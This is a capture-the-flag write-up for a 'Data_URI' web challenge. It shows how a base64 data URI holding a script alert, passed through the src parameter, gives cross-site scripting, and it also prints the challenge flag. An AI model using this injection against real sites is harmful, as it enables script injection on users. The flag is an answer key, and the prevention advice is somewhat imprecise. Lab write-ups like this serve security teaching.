# Data_URI

## flag

```
928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d
```

## Discovery

1. By clicking on the NSA logo, you are redirected to the address:
   [host]/index.php?page=media&src=nsa.

2. Here, you can notice that the image is loaded using the identifier src=nsa. This means it is being accessed through a URI.

3. A URI allows access to a resource without needing its physical location. Using a Data URI, we can embed and execute a script directly.

## Exploitation

1. A Data URI is a method for embedding data directly into a web page. It allows you to include images, scripts, and other resources directly in the HTML code.

2. syntax: `data:[<mediatype>][;base64],<data>`

   - `<mediatype>`: The media type of the data (e.g., text/html, image/png, etc.).
   - `;base64`: Indicates that the data is base64 encoded.
   - `<data>`: The actual data to be embedded.

3. To exploit this vulnerability, we can create a Data URI that contains a script to alert the flag.

## Exploitation (Detailed)

1. create script to alert:
   `<script>alert(42)</script>`
2. convert the script to base64:
   `echo -n "<script>alert(42)</script>" | base64`
3. create the Data URI:
   `data:text/html;base64,PHNjcmlwdD5hbGVydCg0Mik8L3NjcmlwdD4=`
4. replace the `src` parameter with the Data URI:
   `index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCg0Mik8L3NjcmlwdD4=`
5. Open the URL and observe the alert box displaying the flag.

# Prevention

1. **Sanitize User Input**: Always validate and sanitize user input to prevent the execution of malicious scripts.

2. **Avoid Data URIs**: Avoid using Data URIs to load external resources, as they can be used to execute arbitrary code.

3. **use data base to store the images and other resources**: Instead of using Data URIs, store images and other resources in a database or on the server and load them securely.
